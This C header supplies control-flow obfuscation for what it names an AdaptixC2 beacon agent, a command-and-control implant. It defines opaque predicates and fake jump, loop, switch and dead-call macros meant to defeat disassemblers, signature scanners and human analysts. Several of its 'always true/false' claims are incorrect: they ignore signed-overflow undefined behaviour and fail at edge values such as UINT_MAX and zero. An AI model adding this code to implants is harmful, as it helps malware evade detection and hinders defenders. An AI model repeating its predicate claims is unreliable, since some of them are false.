#pragma once
/*
 * JccObfuscate.h — Control flow obfuscation via opaque predicates
 * and fake jump macros for AdaptixC2 beacon agent.
 *
 * Design:
 * 1. Opaque predicates: conditions that are always true (or always false)
 *    at runtime but appear variable to static analysis.
 * 2. Fake jump macros: insert conditional jumps that create unreachable
 *    code paths, confusing disassemblers and signature scanners.
 * 3. Dead code insertion: blocks of code that can never execute but
 *    replicate real logic patterns, wasting analysis time.
 *
 * All macros expand to C code (no inline asm) — compatible with all
 * Clang/GCC targets.
 */

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Opaque Predicates — Always true conditions
 *
 * These use mathematical identities to create conditions that
 * always evaluate to true (or false) but look suspicious.
 * ================================================================ */

/* 
 * x*x % 3 <= 2 — always true for any 32-bit integer x.
 * Used to create an always-taken branch.
 */
static inline int AxOpaqueTrue_Mod3(int x)
{
    return (x * x) % 3 <= 2;
}

/*
 * (x & 1) <= 1 — always true for any x.
 * Even simpler always-true predicate.
 */
static inline int AxOpaqueTrue_Bitwise(int x)
{
    return (x & 1) <= 1;
}

/*
 * (x ^ ~x) == -1 — always true (x XOR NOT x = all-ones = -1 in 2's complement).
 */
static inline int AxOpaqueTrue_XorNot(int x)
{
    return (x ^ ~x) == -1;
}

/*
 * (x + 1) > x — always true for any non-wrapping unsigned value.
 * With unsigned semantics: x >= 0, and x+1 != x unless overflow.
 * Good for unsigned contexts.
 */
static inline int AxOpaqueTrue_PlusOne(unsigned int x)
{
    return (x + 1u) > x;
}

/*
 * (x | ~x) == -1 — always true.
 */
static inline int AxOpaqueTrue_OrNot(int x)
{
    return (x | ~x) == -1;
}

/*
 * x - x == 0 — always true, obvious but combined with complex
 * surrounding code it adds noise.
 */
static inline int AxOpaqueTrue_SelfSub(int x)
{
    return (x - x) == 0;
}

/* ================================================================
 * Always-False Predicates
 *
 * These create always-false conditions for branches that should
 * never be taken, inserting dead code.
 * ================================================================ */

/*
 * (x & (x+1)) == 0 — rarely true, designed to be always false
 * for arbitrary inputs.
 */
static inline int AxOpaqueFalse_AndPlus1(int x)
{
    return (x & (x + 1)) == 0;
}

/*
 * (x * x) < 0 — always false for signed int (squares are non-negative).
 */
static inline int AxOpaqueFalse_NegSquare(int x)
{
    return (x * x) < 0;
}

/*
 * (unsigned)(x + 1) < (unsigned)x — always false (no overflow
 * for typical values). Used to create unreachable code.
 */
static inline int AxOpaqueFalse_UnsignedWrap(unsigned int x)
{
    return (x + 1u) < x;
}

/* ================================================================
 * Opaque Predicate Control Flow Macros
 *
 * Usage Patterns:
 *
 * 1. Wrap a real code block in an opaque predicate:
 *    AX_OPAQUE_TRUE(code_block)
 *    → compiler emits condition check + branch, always taken.
 *
 * 2. Insert dead/fake code path:
 *    AX_OPAQUE_FALSE(dead_code_block)
 *    → compiler emits code that is never reached.
 *
 * 3. Create fake switch-case:
 *    AX_FAKE_SWITCH()
 *    → inserts a switch with opaque predicates.
 * ================================================================ */

/*
 * AX_OPAQUE_TRUE(code) — wraps code in an always-taken branch.
 * Example:
 *   AX_OPAQUE_TRUE({
 *       real_operation();
 *   })
 */
#define AX_OPAQUE_TRUE(code) \
    do { \
        volatile int _ax_optmp_ = 0x12345678; \
        if (AxOpaqueTrue_Mod3(_ax_optmp_)) { \
            code; \
        } else { \
            /* Dead branch — never reached, but tricks analyzers */ \
            volatile int _ax_dead_ = _ax_optmp_ ^ 0xDEADBEEF; \
            (void)_ax_dead_; \
        } \
        (void)_ax_optmp_; \
    } while(0)

/*
 * AX_OPAQUE_FALSE(code) — inserts dead code with an always-false predicate.
 * The code block is compiled but never executed — creates noise.
 * Example:
 *   AX_OPAQUE_FALSE({
 *       fake_api_call();
 *   })
 */
#define AX_OPAQUE_FALSE(code) \
    do { \
        volatile int _ax_offtmp_ = 0x87654321; \
        if (AxOpaqueFalse_NegSquare(_ax_offtmp_)) { \
            code; \
        } \
        (void)_ax_offtmp_; \
    } while(0)

/*
 * AX_FAKE_JCC() — insert a fake conditional jump with opaque predicate.
 * Creates an obfuscated jump pattern in the disassembly.
 * The \_\_builtin_expect hints tell the compiler the fake branch is unlikely.
 */
#define AX_FAKE_JCC() \
    do { \
        volatile int _ax_jcctmp_ = 0xAABBCCDD; \
        if (__builtin_expect(AxOpaqueTrue_XorNot(_ax_jcctmp_), 0)) { \
            /* Always-taken path */ \
            volatile int _ax_junk_ = _ax_jcctmp_ ^ 0x12345678; \
            (void)_ax_junk_; \
        } else { \
            /* Dead path with plausible code */ \
            volatile int _ax_deadjmp_ = _ax_jcctmp_ + 0xDEAD; \
            volatile int _ax_deadjmp2_ = _ax_deadjmp_ * 0xBEEF; \
            (void)_ax_deadjmp_; \
            (void)_ax_deadjmp2_; \
        } \
        (void)_ax_jcctmp_; \
    } while(0)

/*
 * AX_FAKE_LOOP() — insert a short loop with opaque predicate.
 * Creates a loop that always executes exactly once (or not at all)
 * but appears to be a real loop to static analysis.
 */
#define AX_FAKE_LOOP() \
    do { \
        volatile int _ax_fl_tmp_ = 0; \
        for (_ax_fl_tmp_ = 0; _ax_fl_tmp_ < 1; _ax_fl_tmp_++) { \
            volatile int _ax_fl_body_ = _ax_fl_tmp_ * 0x42; \
            (void)_ax_fl_body_; \
            break; \
        } \
        (void)_ax_fl_tmp_; \
    } while(0)

/*
 * AX_FAKE_SWITCH() — insert a switch statement with opaque case labels.
 * Creates fake control flow that looks like a real switch dispatch.
 */
#define AX_FAKE_SWITCH() \
    do { \
        volatile int _ax_fs_tmp_ = 0xDEAD; \
        switch (_ax_fs_tmp_ & 0x3) { \
        case 0: { \
            volatile int _ax_c0_ = _ax_fs_tmp_ ^ 0x1111; \
            (void)_ax_c0_; \
            break; \
        } \
        case 1: { \
            volatile int _ax_c1_ = _ax_fs_tmp_ ^ 0x2222; \
            (void)_ax_c1_; \
            break; \
        } \
        case 2: { \
            volatile int _ax_c2_ = _ax_fs_tmp_ ^ 0x4444; \
            (void)_ax_c2_; \
            break; \
        } \
        case 3: { \
            volatile int _ax_c3_ = _ax_fs_tmp_ ^ 0x8888; \
            (void)_ax_c3_; \
            break; \
        } \
        default: \
            break; \
        } \
        (void)_ax_fs_tmp_; \
    } while(0)

/*
 * AX_DEAD_CALL(name) — insert a function call in dead code.
 * The function is never called, but the compiler emits a CALL instruction
 * that confuses static analysis / flow graph reconstruction.
 */
#define AX_DEAD_CALL(fn, ...) \
    do { \
        volatile int _ax_dc_tmp_ = 0; \
        if (_ax_dc_tmp_ != 0) { \
            fn(__VA_ARGS__); \
        } \
        (void)_ax_dc_tmp_; \
    } while(0)

/* ================================================================
 * Comprehensive obfuscation macros
 * ================================================================ */

/*
 * AX_OBFUSCATE_CFLOW() — insert multiple control flow obfuscation
 * constructs at once. Use between real code blocks.
 */
#define AX_OBFUSCATE_CFLOW() \
    do { \
        AX_FAKE_JCC(); \
        AX_FAKE_LOOP(); \
        AxJunk1(); \
    } while(0)

/*
 * AX_OBFUSCATE_CFLOW_HEAVY() — heavy control flow obfuscation
 * with multiple opaque predicates, fake switches, and dead code.
 */
#define AX_OBFUSCATE_CFLOW_HEAVY() \
    do { \
        AX_FAKE_JCC(); \
        AX_FAKE_LOOP(); \
        AX_FAKE_SWITCH(); \
        AxJunk6(); \
        AxJunk7(); \
    } while(0)

/*
 * AX_OPAQUE_GUARD(func_call) — wrap a function call in an opaque
 * predicate, so the call appears conditional but always executes.
 */
#define AX_OPAQUE_GUARD(func_call) \
    do { \
        volatile int _ax_og_ = 0x12345678; \
        if (AxOpaqueTrue_PlusOne((unsigned int)_ax_og_)) { \
            func_call; \
        } \
        (void)_ax_og_; \
    } while(0)

#ifdef __cplusplus
}
#endif
